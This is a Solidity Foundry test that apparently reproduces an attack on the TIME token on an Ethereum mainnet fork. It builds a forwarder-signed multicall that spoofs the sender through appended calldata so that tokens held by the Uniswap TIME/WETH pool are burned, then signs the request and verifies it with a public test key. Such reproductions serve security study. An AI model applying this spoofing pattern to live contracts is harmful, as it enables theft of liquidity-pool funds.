// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IWETH9.sol";
import "@interface/IUniswapV2.sol";

import "./Forwarder/Forwarder.sol";

import "./ITime.sol";
import "./IForwarder.sol";

ITime constant TIME = ITime(0x4b0E9a7dA8bAb813EfAE92A6651019B8bd6c0a29);
WETH9 constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
IUniswapV2Pair constant TIME_WETH = IUniswapV2Pair(
    0x760dc1E043D99394A10605B2FA08F123D60faF84
);
IForwarder constant forwarder = IForwarder(
    0xc82BbE41f2cF04e3a8efA18F7032BDD7f6d98a81
);

contract TimeTest is Test {
    using ECDSA for bytes32;

    // address recoverAddr = 0xa16A5F37774309710711a8B4E83b068306b21724;
    address recoverAddr = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    uint256 recoverKey =
        0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;

    function setUp() external {
        vm.createSelectFork("mainnet", 18730462);
    }

    function testExploit() public {
        uint256 amountToBurn = 62227259510 ether;
        bytes[] memory datas = new bytes[](1);
        datas[0] = abi.encodePacked(
            TIME.burn.selector,
            amountToBurn,
            address(TIME_WETH)
        );
        bytes memory data = abi.encodeWithSelector(
            TIME.multicall.selector,
            datas
        );

        Forwarder.ForwardRequest memory req = Forwarder.ForwardRequest({
            from: recoverAddr,
            to: address(TIME),
            value: 0,
            gas: 5000000,
            nonce: 0,
            data: data
        });

        ForwarderMock forwarderMock = new ForwarderMock();

        bytes32 digest = forwarderMock._hashTypedDataV4(
            keccak256(
                abi.encode(
                    forwarderMock.TYPEHASH(),
                    req.from,
                    req.to,
                    req.value,
                    req.gas,
                    req.nonce,
                    keccak256(req.data)
                )
            )
        );

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(recoverKey, digest);
        bytes memory signature = abi.encodePacked(r, s, v);
        console.logBytes(signature);

        bool isVerify = forwarder.verify(req, signature);
        console.log(isVerify);
        // assertEq(ecrecover(messageHash, v, r, s), recoverAddr);
    }

    receive() external payable {}
}
